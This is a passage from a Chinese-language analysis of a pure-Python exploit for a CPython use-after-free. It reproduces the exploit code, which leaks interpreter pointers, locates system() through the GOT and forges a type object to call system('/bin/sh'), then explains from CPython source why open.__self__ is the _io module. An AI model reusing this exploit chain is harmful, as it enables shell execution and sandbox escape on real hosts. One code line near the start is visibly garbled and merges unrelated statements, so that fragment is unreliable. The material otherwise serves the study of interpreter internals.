@@ -1,0 +1,196 @@
+            # Leak tp_dealloc pointer of PyLong_Type which points into the Python
+            # binary.
+            leak = self.leak(id(int), 32)
+            cpython_binary_ptr = u64(leak[24:32])
+            addr = (cpython_binary_ptr >> 12) > 32  # ELF64_R_SYM
+                symtab_entry = e.leak(symtab + symtab_idx * SIZEOF_ELF64_SYM, SIZEOF_ELF64_SYM)
+                strtab_off = u32(symtab_entry[0:4])
+                name = e.leak(strtab + strtab_off, 6)
+                if name == b'system':
+                    print('[*] Found system at rela index {}'.format(i))
+                    system_got = u64(rela_data[off:off + 8])
+                    break
+                i += 1
+            func = u64(self.leak(system_got, 8))
+            print('[*] system:     {}'.format(hex(func)))
+            return func
+    e = Exploit()
+    system = e.find_system()
+### 4.2.3 执行函数
+当有了system函数的地址后，应该如何控制程序流程呢？答案依然是伪造，这里可以伪造任意类型的对象obj，并且伪造该对象的类型对象typeobj，obj->ob_type
+= &typeobj，根据1.2
+PyTypeObject的描述，类对象中有函数指针，覆盖为system函数地址，比如`tp_getattr`，然后执行obj.aaa，就会去执行tp_getattr指向的函数了。
+还有一个需要解决的是传参问题，Python在调用对象方法时，第一个参数是对象本身，是一个PyObject _，作者利用这点，将obj->ob_refcnt的值设置为"/bin/sh"，这样第一个参数就相当于是char
+_传递给system了，在64位下，ob_refcnt的长度是8字节，而`/bin/sh\x00`的长度也正好为8，没有超过，否则就覆盖了obj->ob_type的值了。（PS:在调用对象方法时，会使得obj->ob_refcnt+1，所以第一个字节"/"需要减1，也就是`\x2e`了）
+作者的exp如下
+    class Exploit:
+        def set_rip(self, addr, obj_refcount=0x10):
+            """Set rip by using a fake object and associated type object."""
+            # Fake type object
+            type_obj = flat(
+                p64(0xac1dc0de),    # refcount
+                b'X'*0x68,          # padding
+                p64(addr)*100,      # vtable funcs 
+            )
+            self.no_gc.append(type_obj)
+            # Fake PyObject
+            data = flat(
+                p64(obj_refcount),  # refcount
+                p64(id(type_obj)),  # pointer to fake type object
+            )
+            self.no_gc.append(data)
+            # The bytes data starts at offset 32 in the object 
+            self.freed_buffer[0] = id(data) + 32
+            try:
+                # Now we trigger it. This calls tp_getattro on our fake type object
+                self.fake_objs[0].trigger
+            except:
+                # Avoid messy error output when we exit our shell
+                pass
+    e.set_rip(system, obj_refcount=u64(b'\x2ebin/sh\x00'))
+## 4.3 彩蛋
+UAF漏洞是需要io.RawIOBase，因此需要io模块，但作者没有使用import，而是用`io=open.__self__`替代。
+open. **self** 对应的io模块其实是`_io`，这个是Python内置的模块，而`import
+io`导入的io模块是`PYTHON_HOME\lib\io.py`，这个io其实就是对`_io`模块的封装，io.RawIOBase就是对_io._RawIOBase的封装了。
+那么`open.__self__`为什么就是`_io`模块呢，这就是本篇彩蛋的内容了。
+open是`PyCFunctionObject`结构体对象。
+_io是`PyModuleObject`结构体对象。
+### 4.3.1 **self** 是什么
+根据源码，可以知道 **self** 是`PyCFunctionObject`的`m_self`，但是这个值哪儿来呢，需要去看一下`_io`模块的初始化。
+    //3.10.4
+    //Include\cpython\methodobject.h
+    typedef struct {
+        PyObject_HEAD
+        PyMethodDef *m_ml; /* Description of the C function to call */
+        PyObject    *m_self; /* Passed as 'self' arg to the C func, can be NULL */
+        PyObject    *m_module; /* The __module__ attribute, can be anything */
+        PyObject    *m_weakreflist; /* List of weak references */
+        vectorcallfunc vectorcall;
+    } PyCFunctionObject;
+    #define PyCFunction_GET_SELF(func) \
+            (((PyCFunctionObject *)func) -> m_ml -> ml_flags & METH_STATIC ? \
+             NULL : ((PyCFunctionObject *)func) -> m_self)
+    //Objects\methodobject.c
+    static PyObject *
+    meth_get__self__(PyCFunctionObject *m, void *closure)
+    {
+        PyObject *self;
+        self = PyCFunction_GET_SELF(m);
+        if (self == NULL)
+            self = Py_None;
+        Py_INCREF(self);
+        return self;
+    }
+    static PyGetSetDef meth_getsets [] = {
+        {"__doc__",  (getter)meth_get__doc__,  NULL, NULL},
+        {"__name__", (getter)meth_get__name__, NULL, NULL},
+        {"__qualname__", (getter)meth_get__qualname__, NULL, NULL},
+        {"__self__", (getter)meth_get__self__, NULL, NULL},
+        {"__text_signature__", (getter)meth_get__text_signature__, NULL, NULL},
+        {0}
+    };
+### 4.3.2 内置_io模块的初始化
+看下`PyModuleObject`结构体的定义。
+    //3.10.4
+    //Include\internal\pycore_moduleobject.h
+    typedef struct {
+        PyObject_HEAD
+        PyObject *md_dict;
+        struct PyModuleDef *md_def;
+        void *md_state;
+        PyObject *md_weaklist;
+        // for logging purposes after md_dict is cleared
+        PyObject *md_name;
+    } PyModuleObject;
+`PyModuleObject`和`PyCFunctionObject`都有一个描述自身的结构体，分别是`PyModuleDef`、`PyMethodDef`。
+    //3.10.4
+    //Include\moduleobject.h
+    typedef struct PyModuleDef{
+      PyModuleDef_Base m_base;
+      const char* m_name;
+      const char* m_doc;
+      Py_ssize_t m_size;
+      PyMethodDef *m_methods;
+      struct PyModuleDef_Slot* m_slots;
+      traverseproc m_traverse;
+      inquiry m_clear;
+      freefunc m_free;
+    } PyModuleDef;
+    //Include\methodobject.h
+    struct PyMethodDef {
+        const char  *ml_name;   /* The name of the built-in function/method */
+        PyCFunction ml_meth;    /* The C function that implements it */
+        int         ml_flags;   /* Combination of METH_xxx flags, which mostly
+                                   describe the args expected by the C func */
+        const char  *ml_doc;    /* The __doc__ attribute, or NULL */
+    };
+    typedef struct PyMethodDef PyMethodDef;
+基本结构体说完了，来看`_io`模块的初始化函数，`_PyIO_Module`是_io的描述，里面包含了`PyMethodDef
+module_methods`，其中就有`open`方法的描述`_IO_OPEN_METHODDEF`。
+    //3.10.4
+    //Modules\_io\_iomodule.c
+    PyMODINIT_FUNC
+    PyInit__io(void)
+    {
+        PyObject *m = PyModule_Create(&_PyIO_Module);
+        ......
+    }
+    //Include\modsupport.h
+    #ifdef Py_LIMITED_API
+    #define PyModule_Create(module) \
+            PyModule_Create2(module, PYTHON_ABI_VERSION)
+    #else
+    #define PyModule_Create(module) \
+            PyModule_Create2(module, PYTHON_API_VERSION)
+    #endif
+    //Modules\_io\clinic\_iomodule.c.h
+    #define _IO_OPEN_METHODDEF    \
+        {"open", (PyCFunction)(void(*)(void))_io_open, METH_FASTCALL|METH_KEYWORDS, _io_open__doc__},
+    //Modules\_io\_iomodule.c
+    static PyMethodDef module_methods[] = {
+        _IO_OPEN_METHODDEF
+        _IO_TEXT_ENCODING_METHODDEF
+        _IO_OPEN_CODE_METHODDEF
+        {NULL, NULL}
+    };
+    struct PyModuleDef _PyIO_Module = {
+        PyModuleDef_HEAD_INIT,
+        "io",
+        module_doc,
+        sizeof(_PyIO_State),
+        module_methods,
+        NULL,
+        iomodule_traverse,
+        iomodule_clear,
+        (freefunc)iomodule_free,
+    };
+现在来看下具体的`PyModule_Create2`函数：
+  * 在`_PyModule_CreateInitialized`函数中根据模块名称，使用`PyModule_New`创建了一个模块对象`m`；
+  * 调用`PyModule_AddFunctions`为`m`添加方法，`module->m_methods`则是方法描述数组，其中就有open方法描述`_IO_OPEN_METHODDEF`；
+  * 在函数`_add_methods_to_object`中会遍历模块包含的方法描述符数组，为每个`PyMethodDef`对象，调用`PyCFunction_NewEx`来创建一个`PyCFunctionObject`对象，传入的第2个参数module就是`_io`模块对象了，第3个参数是表示_io模块的名称。
+    //Objects\moduleobject.c
+    PyObject *
+    PyModule_Create2(struct PyModuleDef* module, int module_api_version)
+    {
+        if (!_PyImport_IsInitialized(_PyInterpreterState_GET())) {
+            PyErr_SetString(PyExc_SystemError,
+                            "Python import machinery not initialized");
+            return NULL;
+        }
+        return _PyModule_CreateInitialized(module, module_api_version);
+    }
+    PyObject *
+    _PyModule_CreateInitialized(struct PyModuleDef* module, int module_api_version)
+    {
+        const char* name;
+        PyModuleObject *m;
+        .....
+        name = module->m_name;
+        ......
+        if ((m = (PyModuleObject*)PyModule_New(name)) == NULL)
+            return NULL;
+        ......
+        if (module->m_methods != NULL) {
+            if (PyModule_AddFunctions((PyObject *) m, module->m_methods) != 0) {
+                Py_DECREF(m);
+                return NULL;
